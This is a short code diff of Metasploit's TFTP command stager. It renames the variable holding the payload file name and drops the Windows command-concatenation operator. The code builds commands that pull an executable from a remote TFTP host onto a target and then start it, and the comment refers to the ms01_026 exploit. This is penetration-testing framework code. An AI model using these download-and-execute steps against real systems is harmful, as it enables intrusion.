@@ -30,7 +30,7 @@ class CmdStagerTFTP < CmdStagerBase
 	def initialize(exe)
 		super
 
-		@var_payload_out = Rex::Text.rand_text_alpha(8) + ".exe"
+		@payload_exe = Rex::Text.rand_text_alpha(8) + ".exe"
 	end
 
 
@@ -40,10 +40,10 @@ class CmdStagerTFTP < CmdStagerBase
 	#
 	def compress_commands(cmds, opts)
 		# Initiate the download
-		cmds << "tftp -i #{opts[:tftphost]} GET #{opts[:transid]} #{@tempdir + @var_payload_out}"
+		cmds << "tftp -i #{opts[:tftphost]} GET #{opts[:transid]} #{@tempdir + @payload_exe}"
 
 		# Make it all happen
-		cmds << "start #{@tempdir + @var_payload_out}"
+		cmds << "start #{@tempdir + @payload_exe}"
 
 		# Clean up after unless requested not to..
 		if (not opts[:nodelete])
@@ -53,11 +53,11 @@ class CmdStagerTFTP < CmdStagerBase
 		super
 	end
 
-	# Windows uses & to concat strings
-	def cmd_concat_operator
-		" & "
-	end
+	# NOTE: We don't use a concatenation operator here since we only have a couple commands.
+	# There really isn't any need to combine them. Also, the ms01_026 exploit depends on
+	# the start command being issued separately so that it can ignore it :)
 
+	attr_reader :payload_exe
 end
 end
 end
